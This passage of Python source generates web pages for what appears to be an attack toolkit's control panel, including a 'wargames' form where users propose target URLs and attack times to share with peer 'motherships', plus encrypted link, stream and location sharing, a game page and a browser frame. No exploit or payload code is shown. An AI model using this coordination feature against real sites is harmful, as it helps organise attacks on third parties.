<td>
<pre>This feature will allow you to propose/join some real 'wargames'.

<hr>
<center><table cellpadding="5" border="1"><tr><td>Blackhole/IP:</td><td><input type='text' name='wargames_source' id='wargames_source' size='20' value='"""+default_blackhole+"""'></td><td><button title="Download 'wargames' proposed by other motherships..." onclick="SyncWargames()">DOWNLOAD!</button></td><td><form method='GET'><input type="hidden" name="wargames_deckey" id="wargames_deckey" size="20" value='"""+self.crypto_key+"""' READONLY><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_wargames();>Try decryption!</a></td></tr></table></center></form><br><hr><form method='GET'><table cellpadding='5' cellspacing='5'><tr><td>Your proposal:</td><td><input type="text" name="wargames_target" id="wargames_target" size="30" placeholder="http(s)://" required pattern="https?://.+"></td></tr><tr><td>Date time (UTC):</td><td><input type="text" name="wargames_estimated" id="wargames_estimated" size="20" placeholder="dd-mm-yyyy hh:mm:ss" required pattern=".+-.+-.+ .+:.+:.+"> (ex: """+str(now)+""")</td></tr><tr><td>Blackhole/IP:</td><td><input type='text' name='wargames_source2' id='wargames_source2' size='20' value='"""+default_blackhole+"""'></td></tr><tr><td><input type="hidden" name="wargames_enckey" id="wargames_enckey" size="20" value='"""+self.crypto_key+"""' READONLY></td></tr></table></form><button title="Send your proposal to other motherships..." onClick=Send() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">SEND!</button></pre></td></tr></table>
<hr><br>
<u>WARGAMES</u>: (Last Update: <font color='green'>"""+str(l)+"""</font>)<br><br>"""+wargames_table+"""<div id='cmdOut'></div><br><br>"""+ self.pages["/footer"]

    def generate_links(self):
        with open(self.links_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            links_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>CREATION:</u></td><td align='center'><u>TOPIC:</u></td><td align='center'><u>URL:</u></td></tr>"
            for m in self.list_links: # list = creation, topic, url
                if links_msg_sep in m:
                    m = m.split(links_msg_sep)
                    link_creation = m[0][0:12] # creation date
                    link_creation = ''.join(random.sample(link_creation,len(link_creation))) # creation date (obfuscation)
                    link_topic = m[1][0:12] # topic
                    link_topic = ''.join(random.sample(link_topic,len(link_topic))) # topic (obfuscation)
                    link_url = m[2][0:12] # url
                    link_url = ''.join(random.sample(link_url,len(link_url))) # link url (obfuscation)
                    links_table += "<tr><td align='center'>"+str(link_creation)+"</td><td align='center'>"+str(link_topic)+"</td><td align='center'>"+str(link_url)+"</td></tr>"
            links_table += "</table>"
            mother_link = "<div id='links_panel_enc' style='display:block'>"
            links_table = mother_link + links_table + "</div>"
            return links_table

    def generate_streams(self):
        with open(self.streams_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            streams_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>CREATION:</u></td><td align='center'><u>TOPIC:</u></td><td align='center'><u>STREAM:</u></td></tr>"
            for m in self.list_streams: # list = creation, topic, stream
                if streams_msg_sep in m:
                    m = m.split(streams_msg_sep)
                    stream_creation = m[0][0:12] # creation date
                    strean_creation = ''.join(random.sample(stream_creation,len(stream_creation))) # creation date (obfuscation)
                    stream_topic = m[1][0:12] # topic
                    stream_topic = ''.join(random.sample(stream_topic,len(stream_topic))) # topic (obfuscation)
                    stream_url = m[2][0:12] # url
                    stream_url = ''.join(random.sample(stream_url,len(stream_url))) # stream url (obfuscation)
                    streams_table += "<tr><td align='center'>"+str(stream_creation)+"</td><td align='center'>"+str(stream_topic)+"</td><td align='center'>"+str(stream_url)+"</td></tr>"
            streams_table += "</table>"
            mother_stream = "<div id='streams_panel_enc' style='display:block'>"
            streams_table = mother_stream + streams_table + "</div>"
            return streams_table

    def generate_games(self):
        games_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>NAME:</u></td><td align='center'><u>DESCRIPTION:</u></td><td><u>ACTION:</u></td></tr>"
        with open(self.games_file) as f:
            for line in f:
                line = line.strip()
                if games_msg_sep in line:
                    line = line.split(games_msg_sep)
                    game_name = line[0] # name
                    game_description = line[1] # description
                    games_table += "<tr><td align='center'><a onClick='javascript:PlayGame()'>"+str(game_name)+"</a></td><td align='center'>"+str(game_description)+"</td><td align='center'><button id='play_game' onclick='PlayGame();return false;'>PLAY!</button></td></tr>"
            games_table += "</table>"
            f.close()
        mother_games = "<div id='games_panel_enc' style='display:block'>"
        games_table = mother_games + games_table + "</div>"
        return games_table

    def generate_browser(self):
        browser_table = "<iframe width='90%' height='600px' src='"+browser_init_page+"'></frame>"
        return browser_table

    def generate_globalnet(self):
        with open(self.globalnet_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            globalnet_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>OWNER:</u></td><td align='center'><u>COMMENT:</u></td><td align='center'><u>WARPING:</u></td></tr>"
            for m in self.list_globalnet: # list = owner, comment, warping, ip
                if globalnet_msg_sep in m:
                    m = m.split(globalnet_msg_sep)
                    globalnet_owner = m[0][0:12] # owner
                    globalnet_owner = ''.join(random.sample(globalnet_owner,len(globalnet_owner))) # owner (obfuscation)
                    globalnet_comment = m[1][0:32] # comment
                    globalnet_comment = ''.join(random.sample(globalnet_comment,len(globalnet_comment))) # globalnet (obfuscation)
                    globalnet_warp = m[2][0:12] # warp
                    globalnet_warp = ''.join(random.sample(globalnet_warp,len(globalnet_warp))) # warp (obfuscation)
                    globalnet_table += "<tr><td align='center'>"+str(globalnet_owner)+"</td><td align='center'>"+str(globalnet_comment)+"</td><td align='center'>"+str(globalnet_warp)+"</td></tr>"
            globalnet_table += "</table>"
            mother_globalnet = "<div id='globalnet_panel_enc' style='display:block'>"
            globalnet_table = mother_globalnet + globalnet_table + "</div>"
            return globalnet_table

    def html_links(self):
        l = time.ctime(os.path.getmtime(self.links_file)) # get last modified time
        now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
        links_table = self.generate_links()
        return self.pages["/header"] + """<script language="javascript">
function Decrypt_links(){
        link_deckey=document.getElementById("link_deckey").value
        if(link_deckey == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="link_deckey="+escape(link_deckey)
         runCommandX("cmd_decrypt_links",params)
         panel_enc = document.getElementById("links_panel_enc").style.display
         if(panel_enc == "block"){
           panel_enc = document.getElementById("links_panel_enc").style.display = 'none';
        }
       }
      }
function Ranking() {
        var win_ranking = window.open("ranking","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Stats() {
        var win_stats = window.open("stats","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Streams() {
        var win_streams = window.open("streams","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function SyncLinks(){
        link_source=document.getElementById("link_source").value
        if(link_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="link_source="+escape(link_source)
         runCommandX("cmd_sync_links",params)
         setTimeout("location.reload()", 10000)
         }
      }
function LinkFilter(filter, key) {
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_link_filter", params)
        setTimeout("Decrypt_links()", 2000)
}
function Send() {
        link_source2=document.getElementById("link_source2").value
        link_enckey=document.getElementById("link_enckey").value
        link_topic=document.getElementById("link_topic").value
        link_url=document.getElementById("link_url").value
        if(link_source2 == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(link_enckey == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            if(link_url == "http://127.0.0.1") {
            window.alert("You need to enter a valid link");
            return
          }else{
            params="link_source2="+escape(link_source2)+"&link_enckey="+escape(link_enckey)+"&link_topic="+escape(link_topic)+"&link_url="+escape(link_url)
            runCommandX("cmd_transfer_link",params)
            setTimeout("location.reload()", 10000)
            }
          }
        }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
  <td><a href="javascript:alert('Armada KATRAAZKA says: SSSSssshshhhh! """ + self.ranking + """,... this is our ship-library. You can take and leave links, without any price.');"><img src='data:image/png;base64,"""+self.alien10_img+"""'></a></td>
  <td>DATA/LINKS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit ship stats..." onclick="Stats()">VISIT STATS!</button> <button title="Visit global.streams..." onclick="Streams()">VISIT STREAMS!</button></td>
</tr></table>
<hr><br>
<center><table cellpadding="5" border="1"><tr><td>Blackhole/IP:</td><td><input type='text' name='link_source' id='link_source' size='20' value='"""+default_blackhole+"""'></td><td><button title="Download 'links' proposed by other motherships..." onclick="SyncLinks()">DOWNLOAD!</button></td><td><form method='GET'><input type="hidden" name="link_deckey" id="link_deckey" size="20" value='"""+self.crypto_key+"""' READONLY><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_links();>Try decryption!</a></td></tr></table></center></form><br><hr><form method='GET'><table cellpadding='5' cellspacing='5'><tr><td>TOPIC:</td><td> <select id="link_topic">
  <option value="OFF" selected>OFF - NO-Topic</option>
  <option value="WKP">WKP - Wikipedia + Knowledge</option>
  <option value="NSA">NSA - National Space/Security Agency</option>
  <option value="DPW">DPW - Deep Web / Dark Web</option>
  <option value="HCP">HCP - Hacking / Cracking / Phreaking</option>
  <option value="HAR">HAR - Hardware / Electronics</option>
  <option value="FPR">FPR - Freedom / Privacy / Rights</option>
  <option value="HAR">SEC - Hardering / C.R.Y.P.T.O</option>
  <option value="APT">APT - ArT.Trolling / #PSY-OPS</option>
  <option value="SPM">SPM - Propaganda + SPAM</option>
  <option value="SCI">SCI - SCience + phi</option>
  <option value="UFO">UFO - UFONET</option>
  </select></td></tr><tr><td>Your link:</td><td><input type="text" name="link_url" id="link_url" size="90" placeholder="http(s)://" required pattern="https?://.+"></td>
</tr><tr><td>Blackhole/IP:</td><td><input type='text' name='link_source2' id='link_source2' size='20' value='"""+default_blackhole+"""'></td></tr><tr><td><input type="hidden" name="link_enckey" id="link_enckey" size="20" value='"""+self.crypto_key+"""' READONLY></td></tr></table></form><button title="Send your link to other motherships..." onClick=Send() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">SEND!</button></pre></td></tr></table><br><br>
<hr><br>
<u>DATA.LINKS</u>: (Last Update: <font color='green'>"""+str(l)+"""</font>)<br><br>"""+links_table+"""<div id='cmdOut'></div><br><br>"""+ self.pages["/footer"]

    def html_streams(self):
        l = time.ctime(os.path.getmtime(self.streams_file)) # get last modified time
        now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
        streams_table = self.generate_streams()
        return self.pages["/header"] + """<script language="javascript">
function Decrypt_streams(){
        stream_deckey=document.getElementById("stream_deckey").value
        if(stream_deckey == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="stream_deckey="+escape(stream_deckey)
         runCommandX("cmd_decrypt_streams",params)
         panel_enc = document.getElementById("streams_panel_enc").style.display
         if(panel_enc == "block"){
           panel_enc = document.getElementById("streams_panel_enc").style.display = 'none';
        }
       }
      }
function Ranking() {
        var win_ranking = window.open("ranking","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Stats() {
        var win_stats = window.open("stats","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Links() {
        var win_links = window.open("links","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function SyncStreams(){
        stream_source=document.getElementById("stream_source").value
        if(stream_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="stream_source="+escape(stream_source)
         runCommandX("cmd_sync_streams",params)
         setTimeout("location.reload()", 10000)
         }
      }
function StreamFilter(filter, key) {
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_stream_filter", params)
        setTimeout("Decrypt_streams()", 2000)
}
function Send() {
        stream_source2=document.getElementById("stream_source2").value
        stream_enckey=document.getElementById("stream_enckey").value
        stream_topic=document.getElementById("stream_topic").value
        stream_url=document.getElementById("stream_url").value
        if(stream_source2 == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(stream_enckey == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            if (stream_url.startsWith("https://www.youtube.com/watch?v=") == false){
            window.alert("You need to enter a valid (only Youtube is supported) URL stream (ex: https://www.youtube.com/watch?v=xxxxxxxxxxx)");
            return
          }else{
            params="stream_source2="+escape(stream_source2)+"&stream_enckey="+escape(stream_enckey)+"&stream_topic="+escape(stream_topic)+"&stream_url="+escape(stream_url)
            runCommandX("cmd_transfer_stream",params)
            setTimeout("location.reload()", 10000)
            }
          }
        }
      }

function PlayStream(stream_num) {
                var str1 = "play_button_";
                var str2 = stream_num;
                var play_button_id = str1.concat(str2);
                var str3 = "video_";
                var video_play = str3.concat(str2);
                video_id = document.getElementById(play_button_id).value;
                document.getElementById(play_button_id).style.display = 'none';
                document.getElementById(video_play).style.display = 'block';
                document.getElementById(video_play).innerHTML = "<div id='player'></div>";
                var tag = document.createElement('script');
                tag.src = "https://www.youtube.com/iframe_api";
                var firstScriptTag = document.getElementsByTagName('script')[0];
                firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
            }
            var player;
            function onYouTubeIframeAPIReady() {
                player = new YT.Player('player', {
                    height: '390',
                    width: '640',
                    videoId: video_id,
                    events: {
                        'onReady': onPlayerReady,
                        'onStateChange': onPlayerStateChange
                    }
                });
            }
            function onPlayerReady(event) {
                event.target.playVideo();
            }
            var done = false;
            function onPlayerStateChange(event) {
                if (event.data == YT.PlayerState.PLAYING && !done) {
                    done = true;
                }
                if (event.data === 0) {
                   document.getElementById(play_button_id).style.display = 'block';
                   document.getElementById(video_play).style.display = 'none';
                  }
            }
            function stopVideo() {
                player.stopVideo();
                   document.getElementById(play_button_id).style.display = 'block';
                   document.getElementById(video_play).style.display = 'none';
            }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
  <td><a href="javascript:alert('Dr. UHÑÄAUFKATRAAZKA says: Hello! """ + self.ranking + """,... these are the current (audio/video/live) streams available. Enjoy!');"><img src='data:image/png;base64,"""+self.alien9_img+"""'></a></td>
  <td>STREAMS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit ship stats..." onclick="Stats()">VISIT STATS!</button> <button title="Visit ship.links..." onclick="Links()">VISIT LINKS!</button></td>
</tr></table>
<hr><br>
<center><table cellpadding="5" border="1"><tr><td>Blackhole/IP:</td><td><input type='text' name='stream_source' id='stream_source' size='20' value='"""+default_blackhole+"""'></td><td><button title="Download 'streams' proposed by other motherships..." onclick="SyncStreams()">DOWNLOAD!</button></td><td><form method='GET'><input type="hidden" name="stream_deckey" id="stream_deckey" size="20" value='"""+self.crypto_key+"""' READONLY><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_streams();>Try decryption!</a></td></tr></table></center></form><br><hr><form method='GET'><table cellpadding='5' cellspacing='5'><tr><td>TOPIC:</td><td> <select id="stream_topic">
  <option value="OFF" selected>OFF - NO-Topic</option>
  <option value="WKP">WKP - Wikipedia + Knowledge</option>
  <option value="NSA">NSA - National Space/Security Agency</option>
  <option value="DPW">DPW - Deep Web / Dark Web</option>
  <option value="HCP">HCP - Hacking / Cracking / Phreaking</option>
  <option value="HAR">HAR - Hardware / Electronics</option>
  <option value="FPR">FPR - Freedom / Privacy / Rights</option>
  <option value="HAR">SEC - Hardering / C.R.Y.P.T.O</option>
  <option value="APT">APT - ArT.Trolling / #PSY-OPS</option>
  <option value="SPM">SPM - Propaganda + SPAM</option>
  <option value="SCI">SCI - SCience + phi</option>
  <option value="UFO">UFO - UFONET</option>
  </select></td></tr><tr><td>Your (url) stream:</td><td><input type="text" name="stream_url" id="stream_url" size="90" placeholder="http(s)://" required pattern="https?://.+"></td>
</tr><tr><td>Blackhole/IP:</td><td><input type='text' name='stream_source2' id='stream_source2' size='20' value='"""+default_blackhole+"""'></td></tr><tr><td><input type="hidden" name="stream_enckey" id="stream_enckey" size="20" value='"""+self.crypto_key+"""' READONLY></td></tr></table></form><button title="Send your stream to other motherships..." onClick=Send() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">SEND!</button></pre></td></tr></table><br><br>
<hr><br>
<u>VIDEO.STREAMS</u>: (Last Update: <font color='green'>"""+str(l)+"""</font>)<br><br>"""+streams_table+"""<div id='cmdOut'></div><br><br>"""+ self.pages["/footer"]

    def html_games(self):
        games_table = self.generate_games()
        return self.pages["/header"] + """<script language="javascript">
function Ranking() {
        var win_ranking = window.open("ranking","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Wargames() {
        var win_wargames = window.open("wargames","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Stats() {
        var win_stats = window.open("stats","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function PlayGame() {
        var win_game = window.open("spaceinvaders","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
            }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
  <td><a href="javascript:alert('Barrier UJJJHGYTYGASOO-IV says: HI slave!... I mean ... worker!... I mean, """ + self.ranking + """,... Do you wanna play some games?!');"><img src='data:image/png;base64,"""+self.alien12_img+"""'></a></td>
  <td>GAMES device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit ship stats..." onclick="Stats()">VISIT STATS!</button> <button title="Visit current ship.Wargames..." onclick="Wargames()">VISIT WARGAMES!</button></td>
</tr></table>
<hr><br>
<u>SHIP.GAMES</u>: <br><br>"""+games_table+"""<br><br>"""+ self.pages["/footer"]

    def html_spaceinvaders(self):
        return self.pages["/header"] + """<script language="javascript"></script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br><center>
<hr><br>
        <div id="gamecontainer">
        <canvas id="gameCanvas"></canvas>
        </div>
        <div id="info">
            <p>Move with arrow keys or swipe, fire with the space bar or touch. The invaders get faster and drop
                more bombs as you complete each level!</p>
        </div></script><script src="js/spaceinvaders.js"></script><script>
            var canvas = document.getElementById("gameCanvas");
            canvas.width = 800;
            canvas.height = 600;
            var game = new Game();
            game.initialise(canvas);
            game.start();
            window.addEventListener("keydown", function keydown(e) {
                var keycode = e.which || window.event.keycode;
                //  Supress further processing of left/right/space (37/29/32)
                if(keycode == 37 || keycode == 39 || keycode == 32) {
                    e.preventDefault();
                }
                game.keyDown(keycode);
            });
            window.addEventListener("keyup", function keydown(e) {
                var keycode = e.which || window.event.keycode;
                game.keyUp(keycode);
            });
            window.addEventListener("touchstart", function (e) {
                game.touchstart(e);
            }, false);
            window.addEventListener('touchend', function(e){
                game.touchend(e);
            }, false);
            window.addEventListener('touchmove', function(e){
                game.touchmove(e);
            }, false);
            function toggleMute() {
                game.mute();
                document.getElementById("muteLink").innerText = game.sounds.mute ? "unmute" : "mute";
            }
        </script><br><br>"""+ self.pages["/footer"]

    def html_browser(self):
        browser_table = self.generate_browser()
        return self.pages["/header"] + """<script language="javascript">
function Ranking() {
        var win_ranking = window.open("ranking","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Links() {
        var win_links = window.open("links","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Streams() {
        var win_streams = window.open("streams","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
            }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
  <td><a href="javascript:alert('Rockoide GRAAANJJÄEEEB says: HI organic living structure..., """ + self.ranking + """,... You can navigate/surf the Net from here...');"><img src='data:image/png;base64,"""+self.alien13_img+"""'></a></td>
  <td>BROWSER device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit ship.Links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit current ship.Streams..." onclick="Streams()">VISIT STREAMS!</button></td>
</tr></table>
<hr><br>"""+browser_table+"""<br><br>"""+ self.pages["/footer"]

    def html_globalnet(self):
        l = time.ctime(os.path.getmtime(self.links_file)) # get last modified time
        globalnet_table = self.generate_globalnet()
        return self.pages["/header"] + """<script language="javascript">
function Ranking() {
        var win_ranking = window.open("ranking","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Warps() {
        var win_blackholes = window.open("blackholes","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function SyncGlobalnet(){
        globalnet_source=document.getElementById("globalnet_source").value
        if(globalnet_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="globalnet_source="+escape(globalnet_source)
         runCommandX("cmd_sync_globalnet",params)
         setTimeout("location.reload()", 10000)
         }
      }
function Decrypt_globalnet(){
        globalnet_deckey=document.getElementById("globalnet_deckey").value
        if(globalnet_deckey == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="globalnet_deckey="+escape(globalnet_deckey)
         runCommandX("cmd_decrypt_globalnet",params)
         panel_enc = document.getElementById("globalnet_panel_enc").style.display
         if(panel_enc == "block"){
           panel_enc = document.getElementById("globalnet_panel_enc").style.display = 'none';
        }
       }
      }
function GlobalnetFilter(filter, key) {
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_globalnet_filter", params)
        setTimeout("Decrypt_globalnet()", 2000)
}
function Send() {
        globalnet_source2=document.getElementById("globalnet_source2").value
        globalnet_enckey=document.getElementById("globalnet_enckey").value
        globalnet_owner=document.getElementById("globalnet_owner").value
        globalnet_comment=document.getElementById("globalnet_comment").value
        globalnet_warp=document.getElementById("globalnet_warp").value
        if(globalnet_source2 == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(globalnet_enckey == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            params="globalnet_source2="+escape(globalnet_source2)+"&globalnet_enckey="+escape(globalnet_enckey)+"&globalnet_owner="+escape(globalnet_owner)+"&globalnet_comment="+escape(globalnet_comment)+"&globalnet_warp="+escape(globalnet_warp)
            runCommandX("cmd_transfer_globalnet",params)
            setTimeout("location.reload()", 10000)
          }
        }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
  <td><a href="javascript:alert('Senator M.BIRDY says: Welcome ..., """ + self.ranking + """,... These are other visible motherships detected by our technology, that are currently working for the Federation... You can contribute by uploading your location... Remember, to be a strong network, always depends on you!');"><img src='data:image/png;base64,"""+self.alien11_img+"""'></a></td>
  <td>RADAR device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit visible blackhole.Warps..." onclick="Warps()">VISIT WARPS!</button></td>
</tr></table>
<hr><br>
<center><table cellpadding="5" border="1"><tr><td>Blackhole/IP:</td><td><input type='text' name='globalnet_source' id='globalnet_source' size='20' value='"""+default_blackhole+"""'></td><td><button title="Download 'locations' proposed by other motherships..." onclick="SyncGlobalnet()">DOWNLOAD!</button></td><td><form method='GET'><input type="hidden" name="globalnet_deckey" id="globalnet_deckey" size="20" value='"""+self.crypto_key+"""' READONLY><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_globalnet();>Try decryption!</a></td></tr></table></center></form><br><hr><form method='GET'><table cellpadding='5' cellspacing='5'><tr>
<td>Owner (your nick):</td><td><input type="text" maxlength="12" pattern=".{3,12}" title="3 to 12 characters" name="globalnet_owner" id="globalnet_owner" size="12" placeholder="Anonymous"></td></tr><tr><td>Ship Description (short comment):</td><td><input type="text" maxlength="90" name="globalnet_comment" id="globalnet_comment" size="90" placeholder="Uplink open from 00:00-GMT3 until 02:00-GMT3"></td></tr><tr><td>WARPING:</td><td> <select id="globalnet_warp">
  <option value="OFF" selected>OFF - Blackhole technology is -OFF-</option>
  <option value="ON1">ON1 - Blackhole technology is -ON- (download only)</option>
  <option value="ON2">ON2 - Blachhole technology is -ON- (upload/download)</option>
